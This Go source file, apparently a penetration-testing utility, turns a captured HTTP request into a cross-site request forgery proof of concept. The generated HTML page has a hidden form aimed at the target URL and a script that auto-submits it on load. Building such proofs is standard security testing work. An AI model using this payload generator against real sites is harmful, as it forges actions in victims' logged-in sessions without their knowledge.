package pocsrf

import (
	"html/template"
	"io"
	"strings"
)

type Input struct {
	Name  string
	Value string
}

func NewPOC(r io.Reader, schema string) (*POC, error) {
	var buf strings.Builder
	_, err := io.Copy(&buf, r)
	if err != nil {
		return &POC{}, err
	}

	content := buf.String()

	lines := strings.Split(content, "\n")
	methodURL := strings.Split(lines[0], " ")
	method := methodURL[0]
	path := methodURL[1]

	var host string
	for _, line := range lines {
		if strings.Contains(line, "Host") {
			host = strings.Split(line, ": ")[1]
		}
	}

	url := schema + host + path

	inputsLine := lines[len(lines)-2]

	inputsSplitted := strings.Split(inputsLine, "&")

	var inputs []Input

	for _, input := range inputsSplitted {
		name := strings.Split(input, "=")[0]
		val := strings.Split(input, "=")[1]

		inputs = append(inputs, Input{
			Name:  name,
			Value: val,
		})
	}

	return &POC{
		URL:    url,
		Method: method,
		Inputs: inputs,
	}, nil
}

type POC struct {
	URL        string
	Method     string
	ScriptData bool
	Inputs     []Input
}

var tpl = `<html>
	<body>
		<form action="{{ .URL }}" method="{{ .Method }}">

		{{ range .Inputs }}<input type="hidden" name="{{ .Name }}" value="{{ .Value }}"/> 
		{{ end }}
		</form>
		<script>
			document.forms[0].submit();
		</script>
	</body>
</html>
`

func (p *POC) Write(wr io.Writer) error {
	t, err := template.New("").Parse(tpl)
	if err != nil {
		return err
	}

	return t.Execute(wr, p)
}
